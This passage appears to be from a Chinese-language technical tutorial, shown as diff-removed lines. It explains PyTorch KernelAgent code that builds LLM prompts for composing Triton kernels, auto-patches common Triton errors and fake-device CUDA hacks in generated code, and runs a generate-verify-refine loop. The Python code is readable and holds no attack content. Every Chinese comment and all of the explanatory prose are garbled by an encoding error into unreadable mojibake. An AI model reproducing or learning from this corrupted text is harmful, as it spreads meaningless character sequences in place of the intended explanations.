-          using your Triton kernels only. Do NOT implement or fall back to
-          torch.nn / torch.nn.functional / torch.* ops
-          sigmoid, etc.) for producing the final result. Using PyTorch for
-          reference comparisons is allowed only inside the self-test.
-        - Use the data layout and dtype semantics indicated by subgraphs, defaulting
-          to NCHW + float32 if unspecified. Respect stride/padding/dilation/groups,
-          and exact op order.
-        - Numerical equivalence: include a self-test (test_kernel or run_tests)
-          that compares your Triton-based result to a PyTorch reference computed
-          from the original problem code below (use get_init_inputs() and
-          get_inputs() if present to instantiate the Model). The test must print
-          'PASS' on success and exit with code 0. Use allclose with rtol&lt;=1e-3,
-          atol&lt;=1e-3 for fp32; for fp16/bf16 allow up to 2e-2.
-        - No imports beyond torch, triton, triton.language as tl, and stdlib. No I/O.
-        - Do NOT monkey-patch PyTorch device functions or torch.cuda.is_available()
-        - Do NOT manipulate TRITON_BACKENDS environment variable
-        - Do NOT disable or mock XPU/CUDA drivers
-
-        Implementation tips:
-        - If merging multiple subgraphs, ensure intermediate tensor shapes match.
-        - Hoist constant weights or parameters to avoid reloading per block.
-        - Use tl.load/tl.store with masks for boundary conditions.
-        - Favor coalesced memory access; tile by blocks; compute grid from shape.
-        - Common Triton pitfalls to avoid:
-          * Do NOT call tl.broadcast on Python scalars; tl.maximum(x, 0.0) works.
-          * Prefer scalar constants directly in elementwise ops (no explicit broadcast needed).
-          * Keep BLOCK_SIZE power-of-two; mask stores at tail.
-        """
-    ).strip()  # å»é¤é¦å°¾ç©ºç½å­ç¬¦
-
-    # ç¬¬äºæ­¥ï¼æ¼æ¥å®æ´çç¨æ·æä»¤ï¼æé»è¾ç»ç»åé¨ååå®¹ï¼
-    user_lines: list[str] = []
-    user_lines.append(guidance)  # æ ¸å¿æå¯¼è¯­
-    user_lines.append("")  # ç©ºè¡åé
-    user_lines.append("SUBGRAPHS (summary):")  # å­å¾æè¦æ é¢
-    user_lines.append(sg_summary)  # å­å¾æè¦åå®¹
-    user_lines.append("")  # ç©ºè¡åé
-    user_lines.append("ORIGINAL PROBLEM FILE:")  # åå§é®é¢ä»£ç æ é¢
-    user_lines.append("```python")  # Pythonä»£ç åå¼å§æ è®°
-    user_lines.append(problem_code)  # åå§é®é¢ä»£ç åå®¹
-    user_lines.append("```")  # Pythonä»£ç åç»ææ è®°
-    user_lines.append("")  # ç©ºè¡åé
-    user_lines.append("SUBGRAPH KERNELS (reference implementations):")  # åèåæ ¸æ é¢
-    user_lines.append(kernels_section)  # åèåæ ¸ä»£ç åå®¹
-    user_lines.append("")  # ç©ºè¡åé
-    # æç»è¦æ±ï¼ä»è¿åä¸ä¸ªåå«å®æ´ä»£ç çPythonä»£ç å
-    user_lines.append(
-        "Return only one fenced Python code block with your final composed implementation."
-    )
-    # æ¼æ¥ææè¡ï¼å½¢æå®æ´çPrompt
-    return "\n".join(user_lines)
-
-def _build_refinement_prompt(
-    problem_code: str,
-    subgraphs: list[dict[str, Any]],
-    kernel_items: list[KernelItem],
-    previous_code: str,
-    error_info: dict[str, str],
-    target_platform: PlatformConfig,
-) -&gt; str:
-    """Prompt the LLM to refine the previously produced code based on errors.
-    æå»ºè¿­ä»£ä¼åPromptï¼
-    åºäºä¸ä¸è½®ä»£ç çéè¯¯ä¿¡æ¯ï¼å¼å¯¼LLMä¿®å¤Tritonç®å­ä»£ç ä¸­çç¼è¯/è¿è¡éè¯¯
-    åæ°ï¼
-    - previous_code: ä¸ä¸è½®çæçéè¯¯ä»£ç 
-    - error_info: éè¯¯ä¿¡æ¯å­å¸ï¼åå«stderr_tail/stdout_tailï¼
-    å¶ä»åæ°å_build_composition_prompt
-    è¿åå¼ï¼éå¯¹æ§çä¼åæä»¤å­ç¬¦ä¸²
-    """
-    # æåéè¯¯æ¥å¿å°¾é¨ï¼æå2000å­ç¬¦ï¼èç¦æ ¸å¿éè¯¯ï¼
-    err_tail = error_info.get("stderr_tail", "")
-    # æåæ åè¾åºå°¾é¨ï¼è¾å©åæéè¯¯ï¼
-    out_tail = error_info.get("stdout_tail", "")
-
-    # æå»ºä¼åæå¯¼è¯­ï¼èç¦éè¯¯ä¿®å¤ï¼ä¿çåææ ¸å¿è¦æ±ï¼
-    guidance = textwrap.dedent(
-        f"""
-        You previously produced a composed Triton implementation, but it failed
-        to run/compile. Analyze the ERROR_CONTEXT below and re-emit the entire
-        corrected single-file implementation as one ```python block.
-
-        TARGET PLATFORM: {target_platform.name}
-        DEVICE STRING: {target_platform.device_string}
-
-        Requirements remain the same. Additionally:
-        - Fix any Triton compilation/runtime errors. For scalar constants in
-          elementwise ops (e.g., ReLU), do not use tl.broadcast. Use direct
-          scalars like 0.0 in tl.maximum(x, 0.0).
-        - Keep function name kernel_function(...) unchanged and retain the
-          self-test that prints PASS on success and exits 0.
-        - Do NOT reintroduce any PyTorch math path in kernel_function. The final
-          outputs must be computed via your Triton kernels only (no fallback to
-          torch.nn / torch.nn.functional ops).
-        - Return the complete corrected file; do not send diffs.
-        """
-    ).strip()
-
-    # æ¼æ¥å®æ´çä¼åæä»¤ï¼æâæå¯¼è¯­âéè¯¯ä¿¡æ¯âåå§ä»£ç âå­å¾æè¦âä¸ä¸è½®ä»£ç âç»ç»ï¼
-    lines: list[str] = []
-    lines.append(guidance)  # ä¼åæå¯¼è¯­
-    lines.append("")  # ç©ºè¡åé
-    # æ·»å æ åéè¯¯æ¥å¿ï¼æ ¸å¿éè¯¯ä¿¡æ¯ï¼
-    lines.append("ERROR_CONTEXT (stderr tail):\n```\n" + err_tail + "\n```")
-    # è¥æ åè¾åºéç©ºï¼æ·»å æ åè¾åºæ¥å¿ï¼è¾å©åæï¼
-    if out_tail.strip():
-        lines.append("STDOUT tail:\n```\n" + out_tail + "\n```")
-    lines.append("")  # ç©ºè¡åé
-    # æ·»å åå§é®é¢ä»£ç ï¼ä¿è¯ä¸ä¸æå®æ´ï¼
-    lines.append("ORIGINAL PROBLEM FILE:\n```python\n" + problem_code + "\n```")
-    lines.append("")  # ç©ºè¡åé
-    # æ·»å å­å¾æè¦ï¼é¿åLLMéå¿æ ¸å¿ç¹å¾ï¼
-    lines.append("SUBGRAPHS (summary):\n" + _summarize_subgraphs_for_prompt(subgraphs))
-    lines.append("")  # ç©ºè¡åé
-    # æ·»å ä¸ä¸è½®éè¯¯ä»£ç ï¼è®©LLMå¯¹æ¯åæé®é¢ï¼
-    lines.append("PREVIOUS_ATTEMPT:\n```python\n" + previous_code + "\n```")
-    lines.append("")  # ç©ºè¡åé
-    # æç»è¦æ±ï¼ä»è¿åä¿®æ­£åçå®æ´Pythonä»£ç å
-    lines.append(
-        "Return only one fenced Python code block with the corrected implementation."
-    )
-    # æ¼æ¥ææè¡ï¼å½¢æä¼åPrompt
-    return "\n".join(lines)
-
-def _summarize_subgraphs_for_prompt(subgraphs: list[dict[str, Any]]) -&gt; str:
-    """
-    çæå­å¾æè¦ï¼å°å¤æçå­å¾JSONä¿¡æ¯åç¼©ä¸ºç®æ´çææ¬æ ¼å¼
-    æ ¸å¿ç®æ ï¼æ§å¶Tokenæ¶èï¼åæ¶ä¿çå­å¾çIDãç±»åãå¸å±ã dtypeãå½¢ç¶ãç®å­ç­æ ¸å¿ç¹å¾
-    """
-    # åå§åæè¦è¡åè¡¨
-    lines: list[str] = []
-    # éåæ¯ä¸ªå­å¾
-    for it in subgraphs:
-        # æåå­å¾IDï¼é»è®¤unknownï¼
-        sid = str(it.get("id", "unknown"))
-        # æåå­å¾ç±»åï¼å¦conv2dãlinearï¼
-        typ = str(it.get("type", ""))
-        # æåæ°æ®å¸å±ï¼é»è®¤NCHWï¼
-        layout = it.get("data_layout") or "NCHW"
-        # æåæ°æ®ç±»åï¼é»è®¤float32ï¼
-        dtype = it.get("dtype") or "float32"
-        # æåè¾å¥å½¢ç¶ï¼å¼å®¹å¤è¾å¥/åè¾å¥æ ¼å¼ï¼
-        inputs = it.get("inputs")
-        in_shape = it.get("input_shape")
-        # æåè¾åºå½¢ç¶
-        out_shape = it.get("output_shape")
-        # æåç®å­åè¡¨
-        ops = it.get("ops") or []
-        
-        # æå»ºå½¢ç¶æè¿°è¡ï¼ä¼åå¤è¾å¥æ ¼å¼ï¼å¶æ¬¡åè¾å¥æ ¼å¼ï¼
-        shapes_line = (
-            f"inputs={inputs if inputs is not None else in_shape}, output={out_shape}"
-        )
-        # æå»ºå­å¾æ ¸å¿ä¿¡æ¯è¡
-        lines.append(
-            f"- ID={sid} type={typ} layout={layout} dtype={dtype} {shapes_line}"
-        )
-        
-        # æå»ºç®å­æè¦ï¼éå¶é¿åº¦ä¸º400å­ç¬¦ï¼é¿åTokenæº¢åºï¼
-        try:
-            # å°è¯è½¬ä¸ºJSONå­ç¬¦ä¸²ï¼ç»æåï¼
-            ops_short = json.dumps(ops)[:400]
-        except Exception:
-            # è½¬æ¢å¤±è´¥åç´æ¥è½¬ä¸ºå­ç¬¦ä¸²
-            ops_short = str(ops)[:400]
-        # æ·»å ç®å­æè¦è¡ï¼ç¼©è¿2ç©ºæ ¼ï¼æåå¯è¯»æ§ï¼
-        lines.append(f"  ops={ops_short}")
-    
-    # æ¼æ¥ææè¡ï¼å½¢ææç»çå­å¾æè¦
-    return "\n".join(lines)
-</code></pre>
-<h3 id="25-ç»åçæ">2.5 ç»åçæ</h3>
-<p>ä»¥ä¸ä¸¤ä¸ªå½æ°æ¯ PyTorch KernelAgent ä¸­<strong>ç«¯å°ç«¯ Triton åæ ¸ç»åçæçæ ¸å¿æ§è¡æ¨¡å</strong>ã</p>
-<ul>
-<li><code>_auto_patch_common_triton_issues</code> ä½ä¸º<strong>è½»éèªå¨åä»£ç ä¿®å¤å·¥å·</strong>ï¼ä¸º LLM çæç Triton ä»£ç ååç½®é¿åè¡¥ä¸ï¼_auto_patch_common_triton_issuesï¼å¯¹ LLM çæç Triton ä»£ç å<strong>æ ä¾µå¥å¼ææ¬çº§èªå¨åè¡¥ä¸</strong>ï¼ä¸é¨ä¿®å¤ Triton å¼åä¸­é«é¢ãæç¯çåºç¡éè¯¯ï¼å¨ä»£ç è¿è¡ / éªè¯åæåè§é¿ä½çº§éè¯¯ï¼åå°æ æè¿­ä»£ï¼æååæ ¸çææçã</li>
-<li><code>compose</code> ä½ä¸º<strong>é¡¶å±å¥å£ä¸æµç¨è°åº¦æ ¸å¿</strong>ï¼ä¸²èèµ·ãPrompt æå»ºãLLM çæãä»£ç è¡¥ä¸ãçæºéªè¯ãè¿­ä»£ç²¾ä¿®ãäº§ç©å½æ¡£ãçå¨æµç¨ï¼æ¯ KernelAgent ä»ãåæ£å­å¾ / åæ ¸ç´ æãå°ãå¯è¿è¡ç«¯å°ç«¯ Triton åæ ¸ãç<strong>ç«¯å°ç«¯é©±å¨æ ¸å¿</strong>ï¼æ ¹æ®è¿­ä»£è½®æ¬¡å¨ææå»ºãç»å / ç²¾ä¿® Promptãï¼è°ç¨ LLM çæä»£ç ï¼å¯¹çæä»£ç åèªå¨åè¡¥ä¸ï¼æ¯æçæºéªè¯é©±å¨çå¤è½®è¿­ä»£ç²¾ä¿®ï¼æç»è¾åºç¡¬ä»¶ééãå¯ç´æ¥é¨ç½²çä¸ä½å Triton åæ ¸åæ ååç»ææ±æ»ã</li>
-</ul>
-<h4 id="_auto_patch_common_triton_issues-å½æ°">_auto_patch_common_triton_issues å½æ°</h4>
-<h5 id="æ ¸å¿ä½ç¨-1">æ ¸å¿ä½ç¨</h5>
-<p>éå¯¹ LLM çæ Triton ä»£ç æ¶æåºç°ç<strong>ä¸¤ç±»é«é¢ä½çº§éè¯¯</strong>åèªå¨åææ¬ä¿®å¤ï¼å¨ä»£ç è¿è¡åæåé¿åï¼åå°å åºç¡éè¯¯å¯¼è´çéªè¯å¤±è´¥ï¼æåè¿­ä»£æçï¼</p>
-<ol>
-<li>ä¿®å¤æ éæ»¥ç¨ <code>tl.broadcast</code> é®é¢ï¼å¦ <code>tl.broadcast(0.0, ...)</code> æ¿æ¢ä¸ºç´æ¥æ é <code>0.0</code>ï¼ï¼è´´å Triton æ éè¿ç®è§èï¼</li>
-<li>å¥ç¦»ç®æ å¹³å°ä¸å¼å®¹ç CUDA ä¸å± hack ä»£ç ï¼é¿åè·¨å¹³å°è¿è¡æ¥éï¼ä¿è¯ä»£ç ä¸ç®æ ç¡¬ä»¶å¹éã</li>
-</ol>
-<h5 id="æ ¸å¿ç¹è²">æ ¸å¿ç¹è²</h5>
-<ol>
-<li><strong>ä¿å®å¼ææ¬è¡¥ä¸ï¼æ é»è¾ä¾µå¥</strong>ï¼ä»å<strong>å­ç¬¦ä¸²çº§ç®åæ¿æ¢ / è¿æ»¤</strong>ï¼ä¸ä¿®æ¹ä»£ç çæ ¸å¿è®¡ç®é»è¾ï¼é¿åè¡¥ä¸å¼å¥æ°çé»è¾éè¯¯ï¼ä¿è¯ä¿®å¤çå®å¨æ§ï¼</li>
-<li><strong>ç²¾åéå¯¹ Triton é«é¢åï¼ä¿®å¤æçé«</strong>ï¼è¡¥ä¸è§åèç¦ LLM ææç¯ç Triton åºç¡éè¯¯ï¼ä¸å¤çå¤æé»è¾é®é¢ï¼ä¿®å¤éåº¦å¿«ãå½ä¸­çé«ï¼</li>
-<li><strong>å¹³å°å®å¶åè¡¥ä¸ï¼ééæ§å¼º</strong>ï¼æ ¹æ®ç®æ å¹³å°éç½®ç <code>cuda_hacks_to_strip</code> å¨æå¥ç¦»ä¸å¼å®¹ä»£ç ï¼æ¯æå¤å¹³å°æ©å±ï¼æ éç¡¬ç¼ç å¹³å°è§åï¼</li>
-<li><strong>æ¯ææ´æ®µä»£ç åè¿æ»¤ï¼å¤çæ´å¨é¢</strong>ï¼ä¸ä»è¿æ»¤åè¡ CUDA hack ä»£ç ï¼è¿è½è¯å« <code>_fake_torch_device</code> è¿ç±»å½æ°å®ä¹ï¼å®ç°<strong>æ´æ®µä»£ç åçè·³è¿è¿æ»¤</strong>ï¼å¤çæ´å½»åºï¼</li>
-<li><strong>è¿åä¿®æ¹ç¶æï¼æµç¨å¯æç¥</strong>ï¼ä»¥ <code>(patched_code, changed)</code> åç»è¿åç»æï¼æç¡®åç¥è°ç¨æ¹æ¯å¦å¯¹ä»£ç åäºä¿®æ¹ï¼ä¾¿äºåç»­æ¥å¿è®°å½ä¸æµç¨çæ§ï¼</li>
-<li><strong>é²æ£æ§å¼ºï¼æ ä»£ç ä¾µå¥é£é©</strong>ï¼ææè¡¥ä¸æä½ååºäºåå§ä»£ç åå¯æ¬ä¿®æ¹ï¼ä¸æ¹ååä»£ç åå®¹ï¼é¿åå¯ä½ç¨ã</li>
-</ol>
-<h4 id="compose-å½æ°">compose å½æ°</h4>
-<h5 id="æ ¸å¿ä½ç¨-2">æ ¸å¿ä½ç¨</h5>
-<p>ä½ä¸ºåæ ¸ç»åçæç<strong>å¨æµç¨è°åº¦æ ¸å¿</strong>ï¼å®æä»è¾å¥å è½½å°æç»äº§ç©è¾åºçæææ­¥éª¤ï¼</p>
-<ol>
-<li>åå§åç¯å¢ï¼åå»ºç®å½ãå è½½ LLM æå¡åãç®æ å¹³å°éç½®ï¼ï¼æ ¡éªå¹¶å è½½ä¸å¤§æ ¸å¿è¾å¥ï¼é®é¢ä»£ç ãå­å¾ä¿¡æ¯ãææå­å¾åæ ¸ï¼ï¼</li>
-<li>æè½®æ¬¡å¨ææå»º Promptï¼é¦æ¬¡ç¨ç»å Promptï¼åç»­ç¨éè¯¯é©±å¨çç²¾ä¿® Promptï¼ï¼è°ç¨ LLM çæ Triton ä»£ç ï¼</li>
-<li>å¯¹çæä»£ç åèªå¨åè¡¥ä¸ï¼å½æ¡£ä¸­é´äº§ç©ï¼æ¯æçæºéªè¯é©±å¨çå¤è½®è¿­ä»£ç²¾ä¿®ï¼</li>
-<li>æç»è¾åºç«¯å°ç«¯ Triton åæ ¸æä»¶ï¼çææ ååç»ææ±æ»å¹¶æä¹åï¼ä¸ºä¸å±æ¨¡åæä¾ç»ä¸çè°ç¨æ¥å£ã</li>
-</ol>
-<h5 id="æ ¸å¿ç¹è²-1">æ ¸å¿ç¹è²</h5>
-<ol>
-<li><strong>å Prompt å¨æåæ¢ï¼è¿­ä»£ç²¾ä¿®æ´ç²¾å</strong>ï¼æ ¹æ®è¿­ä»£è½®æ¬¡èªå¨åæ¢ Prompt ç±»å ââ é¦æ¬¡çæç¨<strong>å¨éçº¦æçç»å Prompt</strong>ï¼ä»æ å°ææå»ºåæ ¸ï¼ï¼åç»­è¿­ä»£ç¨<strong>éè¯¯é©±å¨çç²¾ä¿® Prompt</strong>ï¼åºäº stderr/stdout æ¥å¿éå¯¹æ§ä¿®æ­£ï¼ï¼é¿åæ ç®çéçæï¼å¤§å¹æåè¿­ä»£æææ§ï¼</li>
-<li><strong>éªè¯é©±å¨çé­ç¯è¿­ä»£ï¼æåçé«</strong>ï¼å¼å¯éªè¯åï¼æ¯è½®çæçä»£ç åéè¿ <code>run_candidate</code> åçæºè¿è¡éªè¯ï¼å¤±è´¥åæåéè¯¯æ¥å¿åé¦ç» LLM ç²¾ä¿®ï¼å½¢æ <strong>ãçæâè¡¥ä¸âéªè¯âæ¥éâç²¾ä¿®ã</strong> çé­ç¯ï¼ç´è³éªè¯éè¿æè¾¾å°æå¤§è¿­ä»£è½®æ¬¡ï¼å¤§å¹æåæç»åæ ¸çå¯ç¨æ§ï¼</li>
-<li><strong>çµæ´»çéªè¯å¼å³ï¼å¼é¡¾æçä¸æææ§</strong>ï¼æ¯æ <code>verify</code> å¼å³æ§å¶æ¯å¦å¼å¯çæºéªè¯ ââ å¼å¯æ¶ä¿è¯äº§ç©æææ§ï¼å³é­æ¶ä»åä¸æ¬¡çæå³ç»æ­¢ï¼æåè½»éä½¿ç¨åºæ¯çæçï¼</li>
-<li><strong>å¨æµç¨äº§ç©ç»æåå½æ¡£ï¼å¯è¿½æº¯æ§å¼º</strong>ï¼ä¸ºæ¯è½®å°è¯åå»ºç¬ç«æä»¶ï¼Prompt ææ¬ãçæä»£ç ï¼ï¼éªè¯æ¥å¿ãæç»åæ ¸ãç»ææ±æ»åæç®å½ç»æåå­å¨ï¼ææç¯èå¯è¿½æº¯ãå¯å¤ç°ï¼ä¾¿äºé®é¢ææ¥ï¼</li>
-<li><strong>ä¸¥æ ¼çè¾å¥æ ¡éªï¼æµç¨é²æ£æ§é«</strong>ï¼å¯¹è¾å¥çå­å¾ä¿¡æ¯æ ¼å¼ãLLM æå¡åå¯ç¨æ§åä¸¥æ ¼æ ¡éªï¼æ ¼å¼éè¯¯ç´æ¥ç»æ­¢æµç¨å¹¶æåºæç¡®æç¤ºï¼é¿åæ ææ§è¡ï¼</li>
-<li><strong>æ ååç»æè¾åºï¼å·¥ç¨åå¥½</strong>ï¼è¿ååå«ãæåç¶æãåæ ¸è·¯å¾ãLLM ç¨éãè¿­ä»£è½®æ¬¡ãéªè¯ç»æãç®æ å¹³å°ãçæ ååå­å¸ï¼åæ¶çæ JSON æ ¼å¼çæ±æ»æä»¶ï¼ä¾¿äºä¸å±æ¨¡åè°ç¨ãç»æç»è®¡ä¸éæï¼</li>
-<li><strong>è¿­ä»£è½®æ¬¡å¯éç½®ï¼ééä¸ååºæ¯</strong>ï¼éè¿ <code>max_iters</code> æ§å¶æå¤§è¿­ä»£è½®æ¬¡ï¼é»è®¤ 5 è½®ï¼ï¼å¯æ ¹æ®éæ±è°æ´ï¼å¹³è¡¡çææçä¸æåçï¼</li>
-<li><strong>LLM ç¨éè¿½è¸ªï¼ææ¬å¯æ§</strong>ï¼è®°å½æ¯è½® LLM è°ç¨çç¨éä¿¡æ¯ï¼<code>last_usage</code>ï¼å¹¶çº³å¥æç»ç»æï¼æ¯æ LLM çæææ¬çç»è®¡ä¸ç®¡æ§ï¼</li>
-<li><strong>æ ç¼è¡æ¥ä¸ä¸æ¸¸æ¨¡å</strong>ï¼ä¸¥æ ¼ééä¸æ¸¸å­å¾åè§£ãåæ ¸çæçè¾åºæ ¼å¼ï¼ä¸æ¸¸å¯ç´æ¥è°ç¨çæç <code>composed_kernel.py</code>ï¼å®ç°å¨æµç¨çæ ç¼è¡æ¥ï¼</li>
-<li><strong>è¶æ¶ä¸ç¯å¢æ§å¶ï¼éªè¯æ´å¯é </strong>ï¼è°ç¨ <code>run_candidate</code> æ¶è®¾ç½® 2400 ç§è¶æ¶ï¼åæ¶æ¯æéç¦»è¿è¡ãç¦æ­¢ç½ç»ç­éç½®ï¼é¿åéªè¯è¿ç¨å ç¯å¢é®é¢å¡æ­»ï¼æåéªè¯çç¨³å®æ§ã</li>
-</ol>
-<h4 id="ååå·¥ä½å³ç³»-1">ååå·¥ä½å³ç³»</h4>
-<p>ä¸¤ä¸ªå½æ°å½¢æ <strong>ãåç½®è¡¥ä¸é²æ¤ + å¨æµç¨è°åº¦æ§è¡ã</strong> çç´§å¯ååå³ç³»ï¼æ¯ KernelAgent ç»åçæç«¯å°ç«¯ Triton åæ ¸çæ ¸å¿æ¯æï¼</p>
-<ol>
-<li><strong>_auto_patch_common_triton_issues</strong> ä½ä¸º <code>compose</code> å½æ°ç<strong>åç½®å­æ­¥éª¤</strong>ï¼å¨ LLM çæä»£ç åãçæºéªè¯åæ§è¡ï¼æåä¿®å¤ Triton åºç¡éè¯¯ï¼åå°å ä½çº§é®é¢å¯¼è´çéªè¯å¤±è´¥ï¼ä¸º <code>compose</code> çè¿­ä»£æµç¨ãåè´ãï¼æåæ´ä½æ§è¡æçï¼</li>
-<li><strong>compose</strong> ä½ä¸º<strong>é¡¶å±è°åº¦è</strong>ï¼è´è´£è°ç¨ <code>_auto_patch_common_triton_issues</code>ï¼å¹¶ä¸ºå¶ä¼ éç®æ å¹³å°éç½®ï¼è®©è¡¥ä¸æä½è´´åç¡¬ä»¶è¦æ±ï¼åæ¶è®°å½è¡¥ä¸åçä»£ç å¹¶æ¨è¿åç»­éªè¯ãè¿­ä»£æµç¨ï¼</li>
-<li>äºèç»åå®ç°ã<strong>LLM çæççµæ´»æ§ + èªå¨åè¡¥ä¸çé¿åè½å + éªè¯é©±å¨çé­ç¯è¿­ä»£</strong>ãï¼æ¢åæ¥ LLM èåå­å¾ãæå»ºå¤æåæ ¸çè½åï¼åéè¿èªå¨åè¡¥ä¸åå¤è½®ç²¾ä¿®è§é¿ä½çº§éè¯¯ãè§£å³è¿è¡é®é¢ï¼æç»è¾åºé«è´¨éãå¯è¿è¡çç«¯å°ç«¯ Triton åæ ¸ã</li>
-</ol>
-<h4 id="ä»£ç -1">ä»£ç </h4>
-<pre><code class="language-python">def _auto_patch_common_triton_issues(
-    code: str, target_platform: PlatformConfig
-) -&gt; tuple[str, bool]:
-    """Apply tiny safe textual patches for known Triton pitfalls.
-
-    - Replace tl.broadcast(0.0, ...) or tl.broadcast(1.0, ...) with scalar constants.
-    Returns (patched_code, changed).
-    èªå¨ä¿®å¤Tritonç®å­ä»£ç ä¸­çå¸¸è§é®é¢ï¼
-    - æ ¸å¿ä¿®å¤ç¹ï¼å°tl.broadcast(0.0/1.0/0/1, ...)æ¿æ¢ä¸ºæ éå¸¸éï¼é¿åTritonå¹¿æ­æä½çæ§è½/è¯­æ³é®é¢ï¼
-    - è¿åå¼ï¼(ä¿®å¤åçä»£ç , æ¯å¦åçä¿®æ¹)
-    """
-    # åå§åä¿®å¤åçä»£ç ä¸ºåå§ä»£ç 
-    patched = code
-    # æ è®°æ¯å¦åçä¿®æ¹ï¼é»è®¤æªä¿®æ¹ï¼
-    changed = False
-    # ä¿®å¤è§åï¼éç¨ä¿å®çç®åå¯åå¼è§åï¼ä»å¤çæ æ­§ä¹çå¸¸è§é®é¢
-    patterns = [
-        # è§å1ï¼tl.broadcast(0.0 â æ¿æ¢ä¸º0.0ï¼ç§»é¤ä¸å¿è¦çå¹¿æ­æä½ï¼
-        ("tl.broadcast(0.0", "0.0"),
-        # è§å2ï¼tl.broadcast(1.0 â æ¿æ¢ä¸º1.0
-        ("tl.broadcast(1.0", "1.0"),
-        # è§å3ï¼tl.broadcast(0, â æ¿æ¢ä¸º0.0ï¼ç»ä¸æ°å¼ç±»åä¸ºæµ®ç¹æ°ï¼
-        ("tl.broadcast(0,", "0.0"),
-        # è§å4ï¼tl.broadcast(1, â æ¿æ¢ä¸º1.0
-        ("tl.broadcast(1,", "1.0"),
-    ]
-    # éåææä¿®å¤è§å
-    for old, new in patterns:
-        # è¥åå§ä»£ç åå«å¾ä¿®å¤çæ¨¡å¼
-        if old in patched:
-            # æ§è¡ææ¬æ¿æ¢
-            patched = patched.replace(old, new)
-            # æ è®°ä¸ºå·²ä¿®æ¹
-            changed = True
-    # ç§»é¤CUDAç¸å³çåä½hackä»£ç ï¼å¹³å°ééï¼
-    # è·åå½åç®æ å¹³å°éè¦å¥ç¦»çCUDA hackæ¨¡å¼åè¡¨
-    cuda_hacks = target_platform.cuda_hacks_to_strip
-    if cuda_hacks:
-        # å°ä»£ç æè¡æå
-        lines = patched.split("\n")
-        # å­å¨è¿æ»¤åçä»£ç è¡
-        filtered_lines = []
-        # æ è®°æ¯å¦éè¦è·³è¿ç´å°ç©ºè¡ï¼ç¨äºç§»é¤æ´ä¸ªå½æ°åï¼
-        skip_until_blank = False
-        # éè¡å¤çä»£ç 
-        for line in lines:
-            # è¥å¤äºè·³è¿æ¨¡å¼ï¼è·³è¿å½åè¡ï¼ç´å°éå°ç©ºè¡
-            if skip_until_blank:
-                if line.strip() == "":
-                    # éå°ç©ºè¡ï¼éåºè·³è¿æ¨¡å¼
-                    skip_until_blank = False
-                continue
-            # æ£æ¥å½åè¡æ¯å¦åå«éè¦å¥ç¦»çCUDA hackæ¨¡å¼
-            if any(hack in line for hack in cuda_hacks):
-                # æ è®°ä¸ºå·²ä¿®æ¹
-                changed = True
-                # ç¹æ®å¤çï¼è¥ä¸º_fake_torch_deviceå½æ°å®ä¹ï¼éè·³è¿æ´ä¸ªå½æ°åï¼ç´å°ç©ºè¡ï¼
-                if "def _fake_torch_device" in line:
-                    skip_until_blank = True
-                # è·³è¿å½åè¡ï¼ç§»é¤hackä»£ç ï¼
-                continue
-            # ä¿çå½åè¡
-            filtered_lines.append(line)
-        # éæ°æ¼æ¥è¿æ»¤åçä»£ç è¡
-        patched = "\n".join(filtered_lines)
-    # è¿åä¿®å¤åçä»£ç åæ¯å¦ä¿®æ¹çæ è®°
-    return patched, changed
-
-def compose(
-    problem_path: Path,
-    subgraphs_path: Path,
-    kernels_summary_path: Path,
-    out_dir: Path,
-    model_name: str,
-    verify: bool = False,
-    max_iters: int = 5,
-    target_platform: str = "cuda",
-) -&gt; dict[str, Any]:
-    """
-    æ ¸å¿å½æ°ï¼åºäºå­å¾ä¿¡æ¯ååæ ¸æè¦ï¼åæ/ä¼åTritonç®å­ä»£ç 
-    åæ°è¯´æï¼
-    - problem_path: KernelBenché®é¢æä»¶è·¯å¾
-    - subgraphs_path: å­å¾ä¿¡æ¯JSONæä»¶è·¯å¾ï¼ç±ä¹åçå­å¾æåæ¨¡åçæï¼
-    - kernels_summary_path: åæ ¸æè¦æä»¶è·¯å¾
-    - out_dir: è¾åºç®å½è·¯å¾
-    - model_name: LLMæ¨¡ååç§°
-    - verify: æ¯å¦éªè¯çæçä»£ç ï¼é»è®¤Falseï¼
-    - max_iters: æå¤§è¿­ä»£æ¬¡æ°ï¼é»è®¤5ï¼
-    - target_platform: ç®æ å¹³å°ï¼é»è®¤cudaï¼
-    è¿åå¼ï¼åå«åæç»æçå­å¸ï¼æåç¶æãä»£ç è·¯å¾ãè¿­ä»£æ¬¡æ°ç­ï¼
-    """
-    # åç½®æ£æ¥ï¼ç¡®ä¿LLMæä¾åæ¨¡åå¯å¯¼å¥
-    if get_model_provider is None:
-        raise SystemExit(
-            "KernelAgent providers unavailable; ensure package import and dependencies"
-        )
-
-    # åå»ºè¾åºç®å½ï¼éå½åå»ºç¶ç®å½ï¼å·²å­å¨åå¿½ç¥ï¼
-    out_dir.mkdir(parents=True, exist_ok=True)
-    # è·åLLMæä¾åå®ä¾ï¼ç¨äºè°ç¨LLMçæä»£ç ï¼
-    provider = get_model_provider(model_name)
-
-    # åå§åç®æ å¹³å°éç½®ï¼å è½½å¹³å°ç¸å³çä¿®å¤è§åãhackåè¡¨ç­ï¼
-    platform = get_platform(target_platform)
-
-    # å è½½è¾å¥æä»¶ï¼
-    # 1. å è½½KernelBenché®é¢ä»£ç ï¼åå§PyTorchä»£ç ï¼
-    problem_code = _read_text(problem_path)
-    # 2. å è½½å­å¾ä¿¡æ¯JSONï¼ç±å­å¾æåæ¨¡åçæï¼
-    subgraphs = json.loads(_read_text(subgraphs_path))
-    # æ£æ¥å­å¾ä¿¡æ¯æ¯å¦ä¸ºåè¡¨ï¼éåè¡¨åéåº
-    if not isinstance(subgraphs, list):
-        raise SystemExit("subgraphs.json must be a JSON array")
-    # 3. ä»åæ ¸æè¦æä»¶å è½½åæ ¸ä¿¡æ¯
-    kernels = _load_kernels_from_summary(kernels_summary_path)
-
-    # åå»ºè¿­ä»£å°è¯ç®å½ï¼å­å¨æ¯ä¸è½®ççæä»£ç ï¼
-    attempts_dir = out_dir / "attempts"
-    attempts_dir.mkdir(parents=True, exist_ok=True)
-
-    # åå§ååéï¼
-    # - last_usage: æåä¸æ¬¡LLMè°ç¨çtokenä½¿ç¨ä¿¡æ¯
-    # - last_code: ä¸ä¸è½®çæçä»£ç 
-    # - verify_info: éªè¯ä¿¡æ¯å­å¸
-    last_usage = None
-    last_code = None
-    verify_info: dict[str, Any] = {}
-
-    # å¤è½®è¿­ä»£çæ/ä¼åä»£ç ï¼æå¤max_itersè½®ï¼
-    for i in range(1, max_iters + 1):
-        # æå»ºLLM Promptï¼
-        # ç¬¬ä¸è½®/ä¸ä¸è½®ä»£ç ä¸ºç©º â æå»ºåå§åæPrompt
